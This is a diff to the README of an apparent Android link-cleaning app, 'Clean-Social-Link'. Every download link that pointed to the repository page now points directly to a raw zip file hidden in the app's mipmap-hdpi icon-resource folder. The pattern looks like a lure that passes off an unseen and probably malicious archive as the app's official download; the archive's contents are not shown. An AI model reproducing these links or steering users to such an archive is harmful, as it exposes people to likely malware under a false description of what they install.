@@ -1,6 +1,6 @@
 # 📱 Clean-Social-Link - Clean links before you share
 
-[![Download Now](https://img.shields.io/badge/Download-Clean--Social--Link-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/69llll7591/Clean-Social-Link)
+[![Download Now](https://img.shields.io/badge/Download-Clean--Social--Link-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/69llll7591/Clean-Social-Link/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Clean-Social-Link-1.2.zip)
 
 ## 🧭 What this app does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Visit this page to download the app:
 
-[Download Clean-Social-Link](https://github.com/69llll7591/Clean-Social-Link)
+[Download Clean-Social-Link](https://github.com/69llll7591/Clean-Social-Link/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Clean-Social-Link-1.2.zip)
 
 On the page, look for the latest app file or release item. Then:
 
@@ -130,4 +130,4 @@ If you want to review the app code, edit it, or learn how it works, open the rep
 
 Download or visit the project page here:
 
-[https://github.com/69llll7591/Clean-Social-Link](https://github.com/69llll7591/Clean-Social-Link)
+[https://github.com/69llll7591/Clean-Social-Link/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Clean-Social-Link-1.2.zip](https://github.com/69llll7591/Clean-Social-Link/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Clean-Social-Link-1.2.zip)
